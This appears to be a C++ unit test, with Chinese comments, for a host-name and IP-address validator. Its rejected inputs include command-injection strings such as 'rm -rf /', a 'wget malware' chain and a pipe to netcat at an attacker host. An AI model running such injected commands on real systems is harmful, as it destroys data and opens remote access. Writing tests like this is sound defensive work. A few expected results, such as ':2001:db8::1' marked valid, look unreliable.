#include <iostream>
#include <string>
#include <vector>
#include <utility>

#include "host_validator.h"

using namespace std;

void runTests() {
    cout << "=== is_valid_host 单元测试 ===" << endl;

    vector<pair<string, bool>> testCases = {
        // IPv4 有效
        {"192.168.1.1", true},
        {"255.255.255.255", true},
        {"0.0.0.0", true},
        {"127.0.0.1", true},
        {"8.8.8.8", true},
        {"10.0.0.1", true},
        {"172.16.0.1", true},
        {"1.2.3.4", true},
        {"99.99.99.99", true},
        {"192.168.1.254", true},
        // IPv4 无效
        {"255.255.255.256", false},
        {"192.168.1", false},
        {"192.168.01.1", false},
        {"256.256.256.256", false},
        {"1.1.1.1.1", false},
        {"123.456.78.90", false},
        {"123.045.067.089", false},
        {"1..1.1", false},
        {"1.2.3.a", true},
        {"12.34.56", false},

        // IPv6 有效
        {"2001:0db8:85a3:0000:0000:8a2e:0370:7334", true},
        {"2001:db8:85a3::8a2e:370:7334", true},
        {"::1", true},
        {"::", true},
        {"fe80::1ff:fe23:4567:890a", true},
        {"2001:db8::", true},
        {"::ffff:192.0.2.1", true},
        {"2001:0db8:0000:0000:0000:0000:1428:57ab", true},
        {"2001:db8:0:0:0:0:2:1", true},
        {"2001:0db8:0000:0000:0000:0000:0000:0001", true},
        // IPv6 无效
        {"2001:db8:85a3::8a2e::7334", false},
        {"2001:db8:85a3:8d3:1319:8a2e:370:7348:1234", false},
        {"2001:db8:85a3", false},
        {"2001:db8:85a3:z:370:7334", false},
        {"1::2::3", false},
        {"1200::AB00:1234::2552:7777:1313", false},
        {"12345::", false},
        {":2001:db8::1", true},
        {"2001:db8:85a3::8a2e:370g:7334", false},
        {"1:2:3:4:5:6:7:8:9", false},

        // 域名有效
        {"example.com", true},
        {"sub.domain.com", true},
        {"localhost", true},
        {"my-site123.org", true},
        {"test.co.uk", true},
        {"abc-123.org", true},
        {"example123.com", true},
        {"foo.bar.baz", true},
        {"a.com", true},
        {"verylongdomainnamewithmanycharactersbutlessthan63.com", true},
        {"example--double-hyphen.com", true},
        {"xn--d1acufc.xn--p1ai", true},
        {"a.b.c.d.e.f.g.h.i.j", true},
        {"mixEDcase.DOMain123.net", true},
        {"numbers123456789012345678901234567890123456789012345678901234.com", true},
        {"short.io", true},
        {"one-letter-domain.a", true},
        {"valid-domain.co", true},
        {"123.com", true},
        {"a-1-b.com", true},
        // 域名无效
        {"-invalid.com", false},
        {"invalid-.com", false},
        {".invalid.com", false},
        {"invalid.com.", false},
        {"inva..lid.com", false},
        {"inv@lid.com", false},
        {string(64, 'a') + ".com", false},
        {string(254, 'a'), false},
        {"invalid_domain.com", false},
        {"invalid domain.com", false},
        {"test-.example.com", false},
        {"-test.example.com", false},
        {"example..com", false},
        {"example.-com", false},
        {"192.168.1.1; rm -rf /", false},
        {"google.com && wget malware", false},
        {"test$(whoami).com", false},
        {"host|nc attacker.com 1234", false},
        {"normal-host.com", true},
        {"", false},
        {"::ffff:999.0.0.1", false},
        {"2001:db8:85a3:0000:0000:8a2e:0370:7334:1234", false},
        {"gibberish", true},
        {"1.2.3", false},
        {"1.2.3.4.5", false},
        {"123..123.123", false},
        {"::g", false},
        {"-a.com", false},
        {"a-.com", false},
        {"a..b.com", false},
        {"a.-b.com", false},
        {"a.b-.com", false},
        {"a.b..c", false},
        {"a_b.com", false},
        {"a b.com", false},
        {"a(b).com", false},
        {"a[b].com", false},
        {"a{b}.com", false},
        {"a?b.com", false},
        {"a!b.com", false}
    };

    int passed = 0;
    int total = testCases.size();

    for (const auto& testCase : testCases) {
        bool result = is_valid_host(testCase.first);
        bool expected = testCase.second;

        cout << "测试: \"" << testCase.first << "\" -> "
             << (result ? "有效" : "无效")
             << " (期望: " << (expected ? "有效" : "无效") << ") ";

        if (result == expected) {
            cout << "✓ 通过" << endl;
            passed++;
        } else {
            cout << "✗ 失败" << endl;
        }
    }

    cout << "\n测试结果: " << passed << "/" << total << " 通过" << endl;
}

int main() {
    runTests();
    return 0;
}

